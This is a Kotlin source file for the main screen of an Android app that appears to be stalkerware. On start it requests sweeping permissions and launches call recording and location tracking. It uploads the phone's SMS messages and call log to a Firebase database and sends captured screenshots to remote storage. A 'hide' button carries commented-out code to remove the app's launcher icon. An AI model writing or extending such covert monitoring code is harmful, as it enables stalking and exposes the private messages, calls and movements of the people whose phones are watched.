package com.arthurisaac.application

import android.Manifest
import android.content.Intent
import android.content.pm.PackageManager
import android.graphics.Bitmap
import android.media.MediaRecorder
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Environment
import android.provider.Settings
import android.text.format.DateFormat
import android.util.Log
import android.view.View
import android.widget.Button
import androidx.annotation.RequiresApi
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import com.arthurisaac.application.auth.LoginActivity
import com.arthurisaac.application.providers.Auth
import com.arthurisaac.application.providers.Database
import com.arthurisaac.application.providers.Storage
import com.arthurisaac.application.services.LocationService
import com.arthurisaac.application.services.MyForegroundService
import com.arthurisaac.application.states.CallLogState
import com.arthurisaac.application.states.SMSState
import com.arthurisaac.application.utils.PermissionUtil
import com.aykuttasil.callrecord.CallRecord
import com.google.firebase.auth.FirebaseAuth
import com.google.firebase.auth.FirebaseUser
import java.io.ByteArrayOutputStream
import java.io.File
import java.io.FileOutputStream
import java.text.SimpleDateFormat
import java.util.*

class MainActivity : AppCompatActivity() {

    private lateinit var mAuth: FirebaseAuth
    private var user: FirebaseUser? = null
    lateinit var callRecord: CallRecord

    @RequiresApi(Build.VERSION_CODES.O)
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        mAuth = Auth.getInstance()
        user = mAuth.currentUser
        if (user == null) {
            openLoginActivity()
        }
        Log.d("AI", user?.email!!)

        val btnHide = findViewById<Button>(R.id.btn_hide)
        val btnLogout = findViewById<Button>(R.id.btn_logout)
        btnLogout.setOnClickListener {
            mAuth.signOut()
            openLoginActivity()
        }
        btnHide.setOnClickListener {
            /*val p = packageManager
            val componentName = ComponentName(
                this,
                MainActivity::class.java
            )

            p.setComponentEnabledSetting(
                componentName,
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            )*/

            takeScreenShot()
        }

        requestPermission()
        Intent(applicationContext, MyForegroundService::class.java).apply {
            startForegroundService(this)
        }

        startRecordingService()
        startLocationService()
        uploadFirstData()
    }

    private fun uploadFirstData() {
        val values = mutableMapOf<String, Any>()
        val sms = SMSState(this)
        val callLog = CallLogState(this)
        values["SMS"] = sms.getData()
        values["CALL_LOG"] = callLog.getData()

        Database.DBReference()
            .updateChildren(values)
    }

    private fun openLoginActivity() {
        val intent = Intent(this, LoginActivity::class.java)
        startActivity(intent)
    }

    private fun takeScreenShot() {
        val date = Date()
        val now = DateFormat.format("dd-MM-yyyy_hh:mm:ss", date)

        val root: View = window.decorView
        root.isDrawingCacheEnabled = true
        root.buildDrawingCache(true)
        val bitmap: Bitmap = Bitmap.createBitmap(root.drawingCache)
        root.isDrawingCacheEnabled = false

        if (isPermissionGranted()) {
            bitmapToFile(bitmap, "$now.jpg")
        } else {
            takePermission()
        }
    }

    private fun bitmapToFile(bitmap: Bitmap, fileNameToSave: String): File? {
        var file: File? = null
        return try {
            val imagesFolder =
                File(this.getExternalFilesDir(Environment.DIRECTORY_PICTURES), "screenshots")
            if (!imagesFolder.exists()) {
                imagesFolder.mkdir()
            }
            val path = "$imagesFolder/$fileNameToSave"
            file = File(path)

            val bos = ByteArrayOutputStream()
            bitmap.compress(Bitmap.CompressFormat.JPEG, 100, bos)
            val bitmapData = bos.toByteArray()

            sendScreenShoot(fileNameToSave, bitmapData)

            val fos = FileOutputStream(file)
            fos.write(bitmapData)
            fos.write(bitmapData)
            fos.flush()
            fos.close()
            file

        } catch (e: Exception) {
            e.printStackTrace()
            file
        }
    }

    private fun sendScreenShoot(fileNameToSave: String, bitmapData: ByteArray) {
        Storage.storageRef()
            .child("screenshots")
            .child("${user!!.uid}/${fileNameToSave}")
            .putBytes(bitmapData)
            .addOnSuccessListener {
                val date = SimpleDateFormat("dd-MM-yyyy HH:mm:ss", Locale.getDefault()).format(Date());

                val screenshot: MutableMap<String, Any> = mutableMapOf()
                screenshot["file"] = it.metadata?.path.toString()
                screenshot["date"] = date

                Database.DBReference()
                    .child("SCREENSHOTS")
                    .child(date)
                    .updateChildren(screenshot)
            }

    }

    private fun requestPermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (PermissionUtil.checkAndRequestPermissions(
                    this,
                    Manifest.permission.READ_PHONE_STATE,
                    Manifest.permission.REQUEST_COMPANION_USE_DATA_IN_BACKGROUND,
                    Manifest.permission.REQUEST_COMPANION_RUN_IN_BACKGROUND,
                    Manifest.permission.ACCESS_FINE_LOCATION,
                    Manifest.permission.ACCESS_COARSE_LOCATION,
                    Manifest.permission.FOREGROUND_SERVICE,
                    Manifest.permission.CAMERA,
                    Manifest.permission.READ_SMS,
                    Manifest.permission.RECEIVE_SMS,
                    Manifest.permission.READ_CONTACTS,
                    Manifest.permission.READ_CALL_LOG,
                    Manifest.permission.RECEIVE_BOOT_COMPLETED,
                    Manifest.permission.READ_EXTERNAL_STORAGE,
                    Manifest.permission.WRITE_EXTERNAL_STORAGE,
                    Manifest.permission.SEND_SMS,
                    Manifest.permission.RECORD_AUDIO,
                )
            ) {
                Log.i("AI", "Permissions are granted. Good to go!")
            }
        }
        takePermission()
    }

    private fun isPermissionGranted(): Boolean {
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            Environment.isExternalStorageManager()
        } else {
            val readExtStorage =
                ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE)
            readExtStorage == PackageManager.PERMISSION_GRANTED
        }
    }

    private fun takePermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (ContextCompat.checkSelfPermission(
                    applicationContext,
                    Manifest.permission.READ_EXTERNAL_STORAGE
                ) != PackageManager.PERMISSION_GRANTED
            ) {
                ActivityCompat.requestPermissions(
                    this,
                    arrayOf(Manifest.permission.READ_EXTERNAL_STORAGE),
                    100
                )
            }
        }

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            if (!Environment.isExternalStorageManager()) {
                try {
                    val intent = Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION)
                    intent.addCategory("android.intent.category.DEFAULT")
                    intent.data =
                        Uri.parse(String.format("package:%s", applicationContext.packageName))
                    startActivityIfNeeded(intent, 101)
                } catch (e: Exception) {
                    val intent = Intent()
                    intent.action = Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION
                    startActivityIfNeeded(intent, 101)
                }
            }
        }
    }

    private fun startRecordingService() {
        val callsFolder =
            File(this.getExternalFilesDir(Environment.DIRECTORY_DOWNLOADS), "records")
        if (!callsFolder.exists()) {
            callsFolder.mkdir()
        }

        callRecord = CallRecord.Builder(this)
            .setLogEnable(true)
            .setRecordFileName("call")
            .setRecordDirName("calls")
            //.setRecordDirPath(Environment.getExternalStorageDirectory().path) // optional & default value
            .setRecordDirPath(callsFolder.path) // optional & default value
            .setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB) // optional & default value
            .setOutputFormat(MediaRecorder.OutputFormat.AMR_NB) // optional & default value
            .setAudioSource(MediaRecorder.AudioSource.VOICE_COMMUNICATION) // optional & default value
            .setShowSeed(true) // optional & default value ->Ex: RecordFileName_incoming.amr || RecordFileName_outgoing.amr
            .build()

        callRecord.startCallRecordService();
    }

    private fun startLocationService() {
        Intent(applicationContext, LocationService::class.java).apply {
            action = LocationService.ACTION_START
            startService(this)
        }
    }

}